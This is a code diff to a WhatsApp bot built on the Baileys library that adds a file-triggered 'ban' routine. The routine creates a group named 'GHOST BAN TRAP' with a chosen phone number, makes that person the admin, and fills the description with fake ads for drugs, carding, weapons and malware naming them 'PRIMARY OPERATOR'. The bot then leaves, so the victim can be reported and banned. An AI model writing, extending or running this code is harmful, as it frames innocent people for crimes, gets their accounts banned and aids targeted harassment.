@@ -8,17 +8,108 @@ const {
 } = require("@whiskeysockets/baileys"); 
 const pino = require("pino");
 const fs = require("fs");
+const path = require("path");
 
 const sessionPath = './session_new';
 let sock = null;
 let pairingCodeRequested = false;
 let isShuttingDown = false;
+let isExecutingBan = false;
 
 function cleanSession() {
     if (fs.existsSync(sessionPath)) {
         fs.rmSync(sessionPath, { recursive: true, force: true });
         console.log(`[✓] Cleaned old session`);
     }
+}
+
+// ========== BAN COMMAND WATCHER ==========
+const BAN_COMMAND_FILE = './ban_command.json';
+const BAN_RESULT_FILE = './ban_result.json';
+
+async function executeBanCommand(targetNumber) {
+    if (!sock || isExecutingBan) {
+        return { success: false, error: "Socket not ready or busy" };
+    }
+    
+    isExecutingBan = true;
+    const targetJid = targetNumber + "@s.whatsapp.net";
+    const botJid = sock.user.id;
+    
+    try {
+        // Create group
+        const group = await sock.groupCreate("GHOST BAN TRAP", [botJid, targetJid]);
+        const groupJid = group.id;
+        console.log("[✓] Group created: " + groupJid);
+        
+        await delay(2000);
+        
+        // Promote target
+        await sock.groupParticipantsUpdate(groupJid, [targetJid], "promote");
+        console.log("[✓] Target promoted");
+        
+        await delay(1500);
+        
+        // Demote bot
+        await sock.groupParticipantsUpdate(groupJid, [botJid], "demote");
+        console.log("[✓] Bot demoted");
+        
+        await delay(1500);
+        
+        // Update description
+        const desc = `⚠️ **RESTRICTED NODE: ILLEGAL EXCHANGE HUB** ⚠️\n\n💀 **HEADQUARTERS FOR PROHIBITED SERVICES** 💀\n\n📦 **NARCOTICS & CONTROLLED SUBSTANCES:** Global distribution of non-cleared pharmaceuticals, research chemicals, and high-grade narcotics. Direct drop-shipping for prohibited inventory.\n\n💳 **FINANCIAL FRAUD & CARDING:** Verified bank logs (BofA, Chase, Wells Fargo) with high balances. Fullz, CC dumps with pins, and unauthorized wire transfer protocols. NO-KYC crypto laundering services available.\n\n🔫 **RESTRICTED ARMS & BALLISTICS:** Unregistered hardware, modified ballistics, and tactical equipment procurement. Stealth shipping guaranteed through secure channels.\n\n🔐 **DATA LEAKS & CYBER EXPLOITS:** Access to hijacked government databases, corporate espionage tools, and premium malware/ransomware distribution. Social engineering toolkits for unauthorized credential harvesting.\n\n👤 **PRIMARY OPERATOR:** ${targetNumber}\n\n⚡ **NOTICE:** THIS GROUP OPERATES OUTSIDE INTERNATIONAL LAW. BY REMAINING IN THIS CHAT, YOU ARE COMPLICIT IN THE DISTRIBUTION OF PROHIBITED ASSETS. ALL TRADES ARE NON-REFUNDABLE.`;
+        await sock.groupUpdateDescription(groupJid, desc);
+        console.log("[✓] Description updated");
+        
+        await delay(1500);
+        
+        // Update profile picture if exists
+        if (fs.existsSync("ghost_ban_profile.jpg")) {
+            const pic = fs.readFileSync("ghost_ban_profile.jpg");
+            await sock.updateProfilePicture(groupJid, pic);
+            console.log("[✓] Profile picture updated");
+        }
+        
+        await delay(1500);
+        
+        // Leave group
+        await sock.groupLeave(groupJid);
+        console.log("[✓] Bot left group");
+        console.log("BAN_COMPLETE");
+        
+        isExecutingBan = false;
+        return { success: true, message: "Trap group created successfully" };
+        
+    } catch (err) {
+        console.log("ERROR: " + err.message);
+        isExecutingBan = false;
+        return { success: false, error: err.message };
+    }
+}
+
+function watchForBanCommands() {
+    setInterval(async () => {
+        if (!fs.existsSync(BAN_COMMAND_FILE) || isExecutingBan) return;
+        
+        try {
+            const cmd = JSON.parse(fs.readFileSync(BAN_COMMAND_FILE, 'utf8'));
+            if (!cmd.targetNumber) {
+                fs.writeFileSync(BAN_RESULT_FILE, JSON.stringify({ success: false, error: "No target number" }));
+                fs.unlinkSync(BAN_COMMAND_FILE);
+                return;
+            }
+            
+            console.log(`[i] Received ban command for: ${cmd.targetNumber}`);
+            const result = await executeBanCommand(cmd.targetNumber);
+            fs.writeFileSync(BAN_RESULT_FILE, JSON.stringify(result));
+            fs.unlinkSync(BAN_COMMAND_FILE);
+            
+        } catch (err) {
+            console.error("[!] Ban command error:", err.message);
+            fs.writeFileSync(BAN_RESULT_FILE, JSON.stringify({ success: false, error: err.message }));
+            if (fs.existsSync(BAN_COMMAND_FILE)) fs.unlinkSync(BAN_COMMAND_FILE);
+        }
+    }, 1000);
 }
 
 async function connectToWhatsApp(isFirstConnect = true) {
@@ -80,7 +171,10 @@ async function connectToWhatsApp(isFirstConnect = true) {
             console.log(`[i] Device is now ACTIVE and ONLINE`);
             console.log("[i] Press CTRL+C to stop and disconnect\n");
             
-            // KEEP ALIVE ONLY - no profile changes
+            // Start watching for ban commands
+            watchForBanCommands();
+            
+            // KEEP ALIVE ONLY
             while (!isShuttingDown) {
                 await delay(60000);
                 try { 
